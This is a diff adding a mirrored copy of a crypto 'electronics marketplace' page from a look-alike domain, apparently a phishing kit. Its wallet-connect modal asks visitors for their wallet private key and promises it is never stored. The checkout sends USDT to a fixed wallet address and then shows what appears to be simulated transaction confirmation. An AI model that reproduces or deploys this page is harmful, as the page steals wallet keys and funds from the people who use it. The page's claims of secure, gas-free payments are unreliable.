@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from interrlinkkmall.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 06 Jul 2026 18:06:33 GMT -->
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Interlink Network — Crypto Marketplace</title>
+  <link rel="preconnect" href="../fonts.googleapis.com/index.html"/>
+  <link href="../fonts.googleapis.com/css25526.css?family=Inter:wght@300;400;500;600;700;800;900&amp;family=Space+Grotesk:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <link rel="stylesheet" href="style5e1f.css?v=2"/>
+</head>
+<body>
+
+<!-- PRELOADER -->
+<div class="preloader" id="preloader">
+  <div class="ilk-preloader-logo">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500" width="72" height="72">
+      <defs>
+        <linearGradient id="pNG" x1="50" y1="50" x2="440" y2="450" gradientUnits="userSpaceOnUse">
+          <stop offset="0%" stop-color="#D0CDFF"/>
+          <stop offset="42%" stop-color="#9B97F3"/>
+          <stop offset="100%" stop-color="#6B62EA"/>
+        </linearGradient>
+      </defs>
+      <rect x="30" y="58" width="82" height="62" rx="20" fill="url(#pNG)"/>
+      <rect x="38" y="132" width="70" height="208" rx="30" fill="url(#pNG)"/>
+      <path d="M 73 336 C 73 425, 132 458, 172 448"
+            stroke="url(#pNG)" stroke-width="64" stroke-linecap="round" fill="none"/>
+      <path d="M 152 58 L 218 58 C 365 58,432 158,432 258 C 432 358,365 458,218 458
+               L 152 458 L 152 388 L 212 388 C 324 388,360 330,360 258
+               C 360 186,324 128,212 128 L 152 128 Z" fill="url(#pNG)"/>
+    </svg>
+  </div>
+  <p>INTERLINK</p>
+  <span class="pre-sub">Network Marketplace</span>
+</div>
+
+<!-- HEADER -->
+<header id="mainHeader">
+  <div class="header-wrap">
+    <a class="logo" href="#">
+      <div class="logo-img-wrap">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500" width="42" height="42" class="ilk-logo-svg">
+          <defs>
+            <linearGradient id="hNG" x1="50" y1="50" x2="440" y2="450" gradientUnits="userSpaceOnUse">
+              <stop offset="0%" stop-color="#D0CDFF"/>
+              <stop offset="42%" stop-color="#9B97F3"/>
+              <stop offset="100%" stop-color="#6B62EA"/>
+            </linearGradient>
+          </defs>
+          <rect x="30" y="58" width="82" height="62" rx="20" fill="url(#hNG)"/>
+          <rect x="38" y="132" width="70" height="208" rx="30" fill="url(#hNG)"/>
+          <path d="M 73 336 C 73 425, 132 458, 172 448"
+                stroke="url(#hNG)" stroke-width="64" stroke-linecap="round" fill="none"/>
+          <path d="M 152 58 L 218 58 C 365 58,432 158,432 258 C 432 358,365 458,218 458
+                   L 152 458 L 152 388 L 212 388 C 324 388,360 330,360 258
+                   C 360 186,324 128,212 128 L 152 128 Z" fill="url(#hNG)"/>
+        </svg>
+      </div>
+      <span>Interlink<b>Network</b></span>
+    </a>
+
+    <div class="search-container">
+      <div class="search-wrap" id="searchWrap">
+        <i class="fa fa-search search-icon"></i>
+        <input type="text" id="searchInput" placeholder="Search products, brands, categories…" autocomplete="off"/>
+        <button class="search-clear" id="searchClear" onclick="clearSearch()"><i class="fa fa-xmark"></i></button>
+        <div class="search-dropdown" id="searchDropdown"></div>
+      </div>
+    </div>
+
+    <nav class="header-nav">
+      <a href="#" class="nav-link"><i class="fa fa-heart"></i><span class="nav-badge">3</span></a>
+      <a href="#" class="nav-link cart-trigger" onclick="toggleCart(); return false;">
+        <i class="fa fa-bag-shopping"></i>
+        <span class="nav-badge" id="cartBadge">0</span>
+      </a>
+      <button class="ilk-connect-btn" id="ilkConnectBtn" onclick="openWallet()">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500" width="18" height="18" class="ilk-connect-logo">
+          <defs>
+            <linearGradient id="cbNG" x1="50" y1="50" x2="440" y2="450" gradientUnits="userSpaceOnUse">
+              <stop offset="0%" stop-color="#D0CDFF"/><stop offset="42%" stop-color="#9B97F3"/><stop offset="100%" stop-color="#6B62EA"/>
+            </linearGradient>
+          </defs>
+          <rect x="30" y="58" width="82" height="62" rx="20" fill="url(#cbNG)"/>
+          <rect x="38" y="132" width="70" height="208" rx="30" fill="url(#cbNG)"/>
+          <path d="M 73 336 C 73 425,132 458,172 448" stroke="url(#cbNG)" stroke-width="64" stroke-linecap="round" fill="none"/>
+          <path d="M 152 58 L 218 58 C 365 58,432 158,432 258 C 432 358,365 458,218 458 L 152 458 L 152 388 L 212 388 C 324 388,360 330,360 258 C 360 186,324 128,212 128 L 152 128 Z" fill="url(#cbNG)"/>
+        </svg>
+        <span id="ilkConnectLabel">Connect Interlink</span>
+        <span class="ilk-connect-dot hidden" id="ilkConnectDot"></span>
+      </button>
+    </nav>
+
+    <button class="hamburger" id="hamburger" onclick="toggleMobileMenu()"><i class="fa fa-bars"></i></button>
+  </div>
+
+  <!-- CATEGORY BAR -->
+  <div class="cat-bar">
+    <div class="cat-bar-inner">
+      <button class="pill active" data-cat="all" onclick="setCategory(this)">✦ All</button>
+      <button class="pill" data-cat="phones" onclick="setCategory(this)">📱 Phones</button>
+      <button class="pill" data-cat="laptops" onclick="setCategory(this)">💻 Laptops</button>
+      <button class="pill" data-cat="cameras" onclick="setCategory(this)">📷 Cameras</button>
+      <button class="pill" data-cat="tvs" onclick="setCategory(this)">📺 TVs</button>
+      <button class="pill" data-cat="tablets" onclick="setCategory(this)">🖥 Tablets</button>
+      <button class="pill" data-cat="accessories" onclick="setCategory(this)">🎧 Accessories</button>
+    </div>
+  </div>
+</header>
+
+<!-- MOBILE NAV -->
+<div class="mobile-overlay" id="mobileOverlay" onclick="toggleMobileMenu()"></div>
+<nav class="mobile-nav" id="mobileNav">
+  <div class="mobile-nav-header"><span>Menu</span><button onclick="toggleMobileMenu()"><i class="fa fa-xmark"></i></button></div>
+  <a href="#" class="m-nav-item" onclick="setCategory(document.querySelector('[data-cat=all]')); toggleMobileMenu()"><i class="fa fa-table-cells-large"></i> All Products</a>
+  <a href="#" class="m-nav-item" onclick="setCategory(document.querySelector('[data-cat=phones]')); toggleMobileMenu()"><i class="fa fa-mobile"></i> Phones</a>
+  <a href="#" class="m-nav-item" onclick="setCategory(document.querySelector('[data-cat=laptops]')); toggleMobileMenu()"><i class="fa fa-laptop"></i> Laptops</a>
+  <a href="#" class="m-nav-item" onclick="setCategory(document.querySelector('[data-cat=cameras]')); toggleMobileMenu()"><i class="fa fa-camera"></i> Cameras</a>
+  <a href="#" class="m-nav-item" onclick="setCategory(document.querySelector('[data-cat=tvs]')); toggleMobileMenu()"><i class="fa fa-tv"></i> TVs</a>
+  <a href="#" class="m-nav-item" onclick="setCategory(document.querySelector('[data-cat=tablets]')); toggleMobileMenu()"><i class="fa fa-tablet"></i> Tablets</a>
+  <a href="#" class="m-nav-item" onclick="setCategory(document.querySelector('[data-cat=accessories]')); toggleMobileMenu()"><i class="fa fa-headphones"></i> Accessories</a>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-bg"></div>
+  <div class="hero-content">
+    <div class="hero-tag"><i class="fa fa-link"></i> Interlink Network — Blockchain Marketplace</div>
+    <h1>Shop Electronics<br/><span class="gradient-text">with Crypto.</span><br/>Fast & Secure.</h1>
+    <p>The first electronics marketplace powered by Interlink Network. Pay with USDT, confirmed in &lt;10 seconds, 0% gas fee.</p>
+    <div class="hero-cta">
+      <button class="btn-primary" onclick="scrollToProducts()"><i class="fa fa-link"></i> Browse Products</button>
+      <button class="btn-ghost" id="heroWalletBtn" onclick="openWallet()"><i class="fa fa-wallet"></i> Connect Wallet</button>
+    </div>
+    <div class="hero-stats">
+      <div class="stat"><strong>34K+</strong><span>Products</span></div>
+      <div class="stat-div"></div>
+      <div class="stat"><strong>120K+</strong><span>Transactions</span></div>
+      <div class="stat-div"></div>
+      <div class="stat"><strong>0%</strong><span>Gas Fee</span></div>
+    </div>
+  </div>
+  <div class="hero-visual">
+    <div class="floating-card fc1"><i class="fa fa-bolt"></i> Gas Fee 0%</div>
+    <div class="floating-card fc2"><i class="fa fa-link"></i> Interlink Network</div>
+    <div class="floating-card fc3"><i class="fa fa-shield-halved"></i> Secure Payments</div>
+    <img src="../images.unsplash.com/photo-1607082348824-0a96f2a4b9da37b5.jpg?w=600&amp;q=80" alt="hero" class="hero-img"/>
+  </div>
+</section>
+
+<!-- FLASH SALE BAR -->
+<div class="sale-bar">
+  <div class="sale-bar-inner">
+    <div class="sale-label"><i class="fa fa-link"></i> ITL FLASH SALE</div>
+    <div class="sale-timer">
+      <div class="time-box"><span id="th">02</span><small>HRS</small></div>
+      <span class="sep">:</span>
+      <div class="time-box"><span id="tm">45</span><small>MIN</small></div>
+      <span class="sep">:</span>
+      <div class="time-box"><span id="ts">30</span><small>SEC</small></div>
+    </div>
+    <div class="sale-text">Up to <strong>70% off</strong> — Limited stock!</div>
+  </div>
+</div>
+
+<!-- CATEGORIES GRID -->
+<section class="cat-section">
+  <div class="section-title">
+    <h2>Shop by Category</h2>
+    <p>Find the best tech products in your favorite category</p>
+  </div>
+  <div class="cat-grid">
+    <div class="cat-card" onclick="setCategory(document.querySelector('[data-cat=phones]'))" style="--c:#6366f1">
+      <div class="cat-icon">📱</div><span>Phones</span>
+    </div>
+    <div class="cat-card" onclick="setCategory(document.querySelector('[data-cat=laptops]'))" style="--c:#0ea5e9">
+      <div class="cat-icon">💻</div><span>Laptops</span>
+    </div>
+    <div class="cat-card" onclick="setCategory(document.querySelector('[data-cat=cameras]'))" style="--c:#f59e0b">
+      <div class="cat-icon">📷</div><span>Cameras</span>
+    </div>
+    <div class="cat-card" onclick="setCategory(document.querySelector('[data-cat=tvs]'))" style="--c:#10b981">
+      <div class="cat-icon">📺</div><span>TVs</span>
+    </div>
+    <div class="cat-card" onclick="setCategory(document.querySelector('[data-cat=tablets]'))" style="--c:#8b5cf6">
+      <div class="cat-icon">🖥</div><span>Tablets</span>
+    </div>
+    <div class="cat-card" onclick="setCategory(document.querySelector('[data-cat=accessories]'))" style="--c:#f43f5e">
+      <div class="cat-icon">🎧</div><span>Accessories</span>
+    </div>
+    <div class="cat-card" onclick="setCategory(document.querySelector('[data-cat=all]'))" style="--c:#14b8a6">
+      <div class="cat-icon">✦</div><span>All Products</span>
+    </div>
+  </div>
+</section>
+
+<!-- PRODUCTS -->
+<section class="products-section" id="productsSection">
+  <div class="products-header">
+    <div>
+      <h2 id="prodTitle">All Products</h2>
+      <p id="prodCount" class="prod-count">Showing 0 products</p>
+    </div>
+    <div class="filter-row">
+      <div class="price-filter">
+        <span>Price:</span>
+        <input type="range" id="priceRange" min="0" max="860" step="10" value="860" oninput="applyFilters()"/>
+        <span id="priceLabel">≤ 860 ITL</span>
+      </div>
+      <select id="sortSelect" onchange="applyFilters()" class="sort-select">
+        <option value="default">Relevance</option>
+        <option value="price-asc">Price ↑</option>
+        <option value="price-desc">Price ↓</option>
+        <option value="rating">Rating ↓</option>
+        <option value="discount">Discount ↓</option>
+      </select>
+      <div class="view-toggle">
+        <button id="viewGrid" class="vbtn active" onclick="setView('grid')"><i class="fa fa-grid-2"></i></button>
+        <button id="viewList" class="vbtn" onclick="setView('list')"><i class="fa fa-list"></i></button>
+      </div>
+    </div>
+  </div>
+  <div class="product-grid" id="productGrid"></div>
+  <div class="load-more-wrap"><button class="btn-load-more" id="loadMoreBtn" onclick="loadMore()">Load More <i class="fa fa-chevron-down"></i></button></div>
+</section>
+
+<!-- BANNER STRIP -->
+<section class="banner-strip">
+  <div class="banner-item"><i class="fa fa-link"></i><div><strong>Interlink Network</strong><span>Confirmed in &lt;10 seconds</span></div></div>
+  <div class="banner-item"><i class="fa fa-gas-pump"></i><div><strong>0% Gas Fee</strong><span>Zero network costs</span></div></div>
+  <div class="banner-item"><i class="fa fa-shield-halved"></i><div><strong>Blockchain Secure</strong><span>Encrypted transactions</span></div></div>
+  <div class="banner-item"><i class="fa fa-rotate-left"></i><div><strong>30-Day Returns</strong><span>Not happy? Send it back!</span></div></div>
+</section>
+
+<!-- NEWSLETTER -->
+<section class="newsletter">
+  <div class="newsletter-content">
+    <div class="nl-icon"><i class="fa fa-envelope-open-text"></i></div>
+    <h2>Stay Updated with Interlink Network</h2>
+    <p>Subscribe and get exclusive crypto deals & the latest Interlink Network updates</p>
+    <div class="nl-form">
+      <input type="email" placeholder="Enter your email…" id="nlEmail"/>
+      <button onclick="subscribeNewsletter()">Subscribe <i class="fa fa-paper-plane"></i></button>
+    </div>
+  </div>
+</section>
+
+<!-- CART DRAWER -->
+<div class="drawer-overlay" id="drawerOverlay" onclick="toggleCart()"></div>
+<aside class="cart-drawer" id="cartDrawer">
+  <div class="drawer-header">
+    <h3>Cart <span id="cartHeaderCount">(0)</span></h3>
+    <button onclick="toggleCart()"><i class="fa fa-xmark"></i></button>
+  </div>
+  <div class="drawer-body" id="cartBody">
+    <div class="empty-cart"><div class="empty-icon">🛒</div><p>Your cart is empty</p><small>Start shopping now!</small></div>
+  </div>
+  <div class="drawer-footer" id="drawerFooter" style="display:none">
+    <div class="summary-row"><span>Subtotal</span><span id="cartSubtotal">0 ITL</span></div>
+    <div class="summary-row"><span>Shipping</span><span class="free">FREE</span></div>
+    <div class="summary-total"><span>Total</span><span id="cartTotal">0 ITL</span></div>
+    <button class="btn-checkout" onclick="doCheckout()"><i class="fa fa-lock"></i> Checkout Now</button>
+  </div>
+</aside>
+
+<!-- PRODUCT MODAL -->
+<div class="modal-overlay" id="modalOverlay" onclick="closeModal()"></div>
+<div class="product-modal" id="productModal">
+  <button class="modal-close" onclick="closeModal()"><i class="fa fa-xmark"></i></button>
+  <div class="modal-body" id="modalBody"></div>
+</div>
+
+<!-- CHECKOUT MODAL -->
+<div class="co-overlay" id="coOverlay" onclick="closeCheckout()"></div>
+<div class="co-modal" id="coModal">
+  <button class="co-close" onclick="closeCheckout()"><i class="fa fa-xmark"></i></button>
+
+  <!-- STEP INDICATOR -->
+  <div class="co-steps">
+    <div class="co-step active" id="step1ind"><span>1</span> Summary</div>
+    <div class="co-step-line"></div>
+    <div class="co-step" id="step2ind"><span>2</span> Payment</div>
+    <div class="co-step-line"></div>
+    <div class="co-step" id="step3ind"><span>3</span> Transfer</div>
+    <div class="co-step-line"></div>
+    <div class="co-step" id="step4ind"><span>4</span> Confirm</div>
+  </div>
+
+  <!-- STEP 1: ORDER SUMMARY -->
+  <div class="co-page" id="coPage1">
+    <h2 class="co-title">Order Summary</h2>
+    <div class="co-items" id="coItems"></div>
+    <div class="co-form">
+      <h3>Shipping Details</h3>
+      <div class="co-input-row">
+        <div class="co-field"><label>Full Name</label><input type="text" id="rcvName" placeholder="Enter your full name"/></div>
+        <div class="co-field"><label>Phone Number</label><input type="text" id="rcvPhone" placeholder="+1 (xxx) xxx-xxxx"/></div>
+      </div>
+      <div class="co-field"><label>Shipping Address</label><input type="text" id="rcvAddress" placeholder="123 Main St, City, State, ZIP"/></div>
+    </div>
+    <div class="co-total-row"><span>Total Amount</span><span id="coTotalAmt" class="co-total-val">0 ITL</span></div>
+    <button class="co-btn-next" onclick="goToStep2()">Choose Payment Method <i class="fa fa-arrow-right"></i></button>
+  </div>
+
+  <!-- STEP 2: PAYMENT METHOD -->
+  <div class="co-page hidden" id="coPage2">
+    <h2 class="co-title">Payment Method</h2>
+
+    <div class="ilk-pay-display">
+      <div class="ilk-pay-icon"><i class="fa fa-link"></i></div>
+      <div class="ilk-pay-info">
+        <strong>Interlink Network</strong>
+        <span>Pay with USDT · 0% Gas Fee · &lt;10s Confirmation</span>
+      </div>
+      <div class="ilk-pay-check"><i class="fa fa-circle-check"></i></div>
+    </div>
+
+    <div class="ilk-features">
+      <div class="ilk-feat"><i class="fa fa-bolt"></i><span>Instant confirmation</span></div>
+      <div class="ilk-feat"><i class="fa fa-gas-pump"></i><span>Zero gas fee</span></div>
+      <div class="ilk-feat"><i class="fa fa-shield-halved"></i><span>Blockchain secured</span></div>
+      <div class="ilk-feat"><i class="fa fa-percent"></i><span>2% cashback</span></div>
+    </div>
+
+    <div class="co-crypto-note">
+      <i class="fa fa-circle-info"></i>
+      <div>
+        <strong>How it works</strong>
+        <p>You'll be shown a wallet address and QR code. Send the exact USDT amount via Interlink Network — your order confirms automatically in under 10 seconds.</p>
+      </div>
+    </div>
+
+    <div class="co-btn-row">
+      <button class="co-btn-back" onclick="goToStep(1)"><i class="fa fa-arrow-left"></i> Back</button>
+      <button class="co-btn-next" onclick="goToStep3()">Pay with Interlink <i class="fa fa-arrow-right"></i></button>
+    </div>
+  </div>
+
+  <!-- STEP 3: CRYPTO PAYMENT -->
+  <div class="co-page hidden" id="coPage3">
+    <div class="crypto-header">
+      <div class="crypto-logo" id="cryptoLogo"><i class="fa fa-link"></i></div>
+      <div>
+        <h2 class="co-title" id="cryptoTitle" style="margin:0">Interlink Network</h2>
+        <p class="co-subtitle" id="cryptoSubtitle" style="margin:0">Kirim USDT ke alamat di bawah ini</p>
+      </div>
+    </div>
+
+    <div class="payment-box">
+      <div class="pay-amount-display">
+        <div class="pay-amount-crypto">
+          <span id="cryptoAmount">0.00</span>
+          <span class="pay-unit" id="cryptoUnit">USDT</span>
+        </div>
+        <div class="pay-amount-idr">≈ <span id="idrAmount">0 ITL</span></div>
+        <div class="pay-timer-wrap">
+          <i class="fa fa-clock"></i>
+          <span>Complete within </span>
+          <span class="pay-timer" id="payTimer">15:00</span>
+        </div>
+      </div>
+
+      <div class="pay-network-row">
+        <div class="net-badge" id="netBadge"><i class="fa fa-link"></i> Interlink Network</div>
+        <div class="net-conf">✓ Gas fee: <strong>0 USDT</strong></div>
+      </div>
+
+      <!-- QR CODE -->
+      <div class="qr-section">
+        <div class="qr-wrap">
+          <img id="qrImg" src="#" alt="QR Code" />
+          <div class="qr-overlay"><i class="fa fa-link"></i></div>
+        </div>
+        <p class="qr-hint">Scan the QR code with your crypto wallet</p>
+      </div>
+
+      <!-- WALLET ADDRESS -->
+      <div class="wallet-address-box">
+        <div class="wa-label">Destination Wallet Address</div>
+        <div class="wa-row">
+          <span class="wa-addr" id="walletAddr">ILK1xG7mK3pQ9nT2vW8yR4eZ6bA5cD1fH0jL</span>
+          <button class="wa-copy" onclick="copyAddress()" id="copyBtn"><i class="fa fa-copy"></i> Copy</button>
+        </div>
+      </div>
+
+      <!-- STEPS GUIDE -->
+      <div class="pay-guide">
+        <div class="guide-step"><div class="gs-num">1</div><span>Open your crypto wallet (MetaMask, Trust Wallet, etc.)</span></div>
+        <div class="guide-step"><div class="gs-num">2</div><span>Select network <strong id="guideNetwork">Interlink Network</strong></span></div>
+        <div class="guide-step"><div class="gs-num">3</div><span>Send exactly <strong><span id="guideAmount">0</span> <span id="guideUnit">USDT</span></strong> to the address above</span></div>
+        <div class="guide-step"><div class="gs-num">4</div><span>Click "I've Paid" after the transfer is complete</span></div>
+      </div>
+    </div>
+
+    <div class="co-btn-row">
+      <button class="co-btn-back" onclick="goToStep(2)"><i class="fa fa-arrow-left"></i> Back</button>
+      <button class="co-btn-paid" onclick="confirmPayment()"><i class="fa fa-check-circle"></i> I've Paid</button>
+    </div>
+  </div>
+
+  <!-- STEP 4: CONFIRMATION -->
+  <div class="co-page hidden" id="coPage4">
+    <div class="confirm-anim">
+      <div class="confirm-ring">
+        <div class="confirm-icon"><i class="fa fa-check"></i></div>
+      </div>
+    </div>
+    <h2 class="co-title" style="text-align:center">Payment Processing</h2>
+    <p class="co-subtitle" style="text-align:center">Your transaction is being confirmed on the Interlink Network</p>
+
+    <div class="tx-card">
+      <div class="tx-row"><span>Status</span><span class="tx-status pending" id="txStatus"><i class="fa fa-spinner fa-spin"></i> Awaiting Confirmation</span></div>
+      <div class="tx-row"><span>TX Hash</span><span class="tx-hash" id="txHash">0x...</span></div>
+      <div class="tx-row"><span>Network</span><span id="txNetwork">Interlink Network</span></div>
+      <div class="tx-row"><span>Amount</span><span id="txAmount">0 USDT</span></div>
+      <div class="tx-row"><span>Time</span><span id="txTime">—</span></div>
+      <div class="tx-confirm-bar">
+        <div class="tx-progress" id="txProgress"></div>
+      </div>
+      <div class="tx-confirm-label"><span id="txConfirms">0</span>/3 Confirmations</div>
+    </div>
+
+    <div class="tx-success hidden" id="txSuccessBox">
+      <div class="tx-success-msg"><i class="fa fa-circle-check"></i> Payment Successfully Confirmed!</div>
+      <p>Your order is being processed and will be shipped soon. Check your email for order details.</p>
+      <button class="co-btn-next" onclick="finishCheckout()" style="margin-top:16px">Done <i class="fa fa-arrow-right"></i></button>
+    </div>
+
+    <div class="interlink-brand">
+      <i class="fa fa-link"></i> Powered by <strong>Interlink Network</strong>
+    </div>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div class="toasts" id="toastContainer"></div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-top">
+    <div class="footer-brand">
+      <div class="logo">
+        <div class="logo-img-wrap">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500" width="36" height="36">
+            <defs>
+              <linearGradient id="fNG" x1="50" y1="50" x2="440" y2="450" gradientUnits="userSpaceOnUse">
+                <stop offset="0%" stop-color="#D0CDFF"/>
+                <stop offset="42%" stop-color="#9B97F3"/>
+                <stop offset="100%" stop-color="#6B62EA"/>
+              </linearGradient>
+            </defs>
+            <rect x="30" y="58" width="82" height="62" rx="20" fill="url(#fNG)"/>
+            <rect x="38" y="132" width="70" height="208" rx="30" fill="url(#fNG)"/>
+            <path d="M 73 336 C 73 425, 132 458, 172 448"
+                  stroke="url(#fNG)" stroke-width="64" stroke-linecap="round" fill="none"/>
+            <path d="M 152 58 L 218 58 C 365 58,432 158,432 258 C 432 358,365 458,218 458
+                     L 152 458 L 152 388 L 212 388 C 324 388,360 330,360 258
+                     C 360 186,324 128,212 128 L 152 128 Z" fill="url(#fNG)"/>
+          </svg>
+        </div>
+        <span>Interlink<b>Network</b></span>
+      </div>
+      <p>The world's first electronics blockchain marketplace powered by Interlink Network — instant transactions, 0% gas fee, secure & decentralized.</p>
+      <div class="footer-social">
+        <a href="#"><i class="fab fa-instagram"></i></a>
+        <a href="#"><i class="fab fa-tiktok"></i></a>
+        <a href="#"><i class="fab fa-twitter"></i></a>
+        <a href="#"><i class="fab fa-youtube"></i></a>
+      </div>
+    </div>
+    <div class="footer-links">
+      <h4>Shop</h4>
+      <a href="#">Flash Sale</a><a href="#">New Arrivals</a><a href="#">Best Sellers</a><a href="#">Special Deals</a>
+    </div>
+    <div class="footer-links">
+      <h4>Support</h4>
+      <a href="#">Help Center</a><a href="#">Track Order</a><a href="#">Return Policy</a><a href="#">Affiliate Program</a>
+    </div>
+    <div class="footer-links">
+      <h4>Company</h4>
+      <a href="#">About Us</a><a href="#">Careers</a><a href="#">Blog</a><a href="#">Privacy Policy</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>© 2026 Interlink Network. All rights reserved. Powered by ITL Blockchain.</span>
+    <div class="pay-icons">
+      <span>💳</span><span>🏦</span><span>📱</span><span>💰</span>
+    </div>
+  </div>
+</footer>
+
+<!-- WALLET CONNECT MODAL -->
+<div class="wc-overlay" id="wcOverlay" onclick="closeWallet()"></div>
+<div class="wc-modal" id="wcModal">
+  <button class="wc-close" onclick="closeWallet()"><i class="fa fa-xmark"></i></button>
+
+  <!-- brand header -->
+  <div class="wc-header">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500" width="32" height="32">
+      <defs>
+        <linearGradient id="wcNG" x1="50" y1="50" x2="440" y2="450" gradientUnits="userSpaceOnUse">
+          <stop offset="0%" stop-color="#D0CDFF"/><stop offset="42%" stop-color="#9B97F3"/><stop offset="100%" stop-color="#6B62EA"/>
+        </linearGradient>
+      </defs>
+      <rect x="30" y="58" width="82" height="62" rx="20" fill="url(#wcNG)"/>
+      <rect x="38" y="132" width="70" height="208" rx="30" fill="url(#wcNG)"/>
+      <path d="M 73 336 C 73 425,132 458,172 448" stroke="url(#wcNG)" stroke-width="64" stroke-linecap="round" fill="none"/>
+      <path d="M 152 58 L 218 58 C 365 58,432 158,432 258 C 432 358,365 458,218 458 L 152 458 L 152 388 L 212 388 C 324 388,360 330,360 258 C 360 186,324 128,212 128 L 152 128 Z" fill="url(#wcNG)"/>
+    </svg>
+    <div class="wc-header-text">
+      <span>Interlink Network</span>
+      <small>Wallet Connection</small>
+    </div>
+  </div>
+
+  <!-- PAGE: PRIVATE KEY -->
+  <div class="wc-page" id="wcPageKey">
+    <div class="wc-icon-wrap"><i class="fa fa-key"></i></div>
+    <h2 class="wc-title">Connect Wallet</h2>
+    <p class="wc-sub">Enter your private key to connect your Interlink Network wallet and start shopping securely</p>
+
+    <div class="wc-key-info">
+      <div class="wc-key-info-title"><i class="fa fa-circle-info"></i> What is a Private Key?</div>
+      <p>Your private key is a unique cryptographic code that grants access to your wallet. It usually looks like:</p>
+      <code class="wc-key-example">0x4c0883a6910395b1e8f2...</code>
+      <ul>
+        <li>Starts with <strong>0x</strong> followed by 64 hexadecimal characters</li>
+        <li>Found in your wallet app under "Export Private Key" or "Security"</li>
+        <li>Never share this with anyone — it controls your funds</li>
+      </ul>
+    </div>
+
+    <label class="wc-input-label">Private Key</label>
+    <div class="key-input-wrap">
+      <input type="password" id="privateKeyInput" class="key-input" placeholder="0x followed by 64 characters (e.g. 0x4c0883a69...)" autocomplete="off" spellcheck="false"/>
+      <button class="key-eye" onclick="wcToggleKey()" title="Show/Hide"><i class="fa fa-eye" id="keyEyeIcon"></i></button>
+    </div>
+
+    <div class="wc-key-tips">
+      <div class="wc-tip"><i class="fa fa-shield-halved"></i> Encrypted & secured locally on your device</div>
+      <div class="wc-tip"><i class="fa fa-lock"></i> Never stored on our servers</div>
+      <div class="wc-tip"><i class="fa fa-bolt"></i> Instant connection — no gas fees required</div>
+    </div>
+
+    <button class="wc-btn-connect" id="wcConnectBtn" onclick="connectWallet()"><i class="fa fa-link"></i> Connect Wallet</button>
+    <p class="wc-help-link"><i class="fa fa-question-circle"></i> <a href="#" onclick="return false;">How to find my private key?</a></p>
+  </div>
+
+  <!-- PAGE: SUCCESS -->
+  <div class="wc-page hidden" id="wcPageSuccess">
+    <div class="wc-success-anim">
+      <div class="wc-ring"><div class="wc-check-icon"><i class="fa fa-check"></i></div></div>
+    </div>
+    <h2 class="wc-title" style="text-align:center">Wallet Connected!</h2>
+    <p class="wc-sub" style="text-align:center">Your Interlink Network wallet has been successfully connected.</p>
+    <div class="wc-wallet-card">
+      <div class="wc-wallet-label">Wallet Address</div>
+      <div class="wc-wallet-addr" id="wcAddr">ILK1...mNs</div>
+      <div class="wc-wallet-bal-label">Balance</div>
+      <div class="wc-wallet-bal"><span id="wcBal">0.00</span> USDT</div>
+    </div>
+    <button class="wc-btn-main" onclick="wcAfterConnect()" style="width:100%;margin-top:8px">
+      <i class="fa fa-bag-shopping"></i> Continue Shopping
+    </button>
+  </div>
+</div>
+
+<script src="app5e1f.js?v=3"></script>
+</body>
+
+<!-- Mirrored from interrlinkkmall.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 06 Jul 2026 18:06:38 GMT -->
+</html>
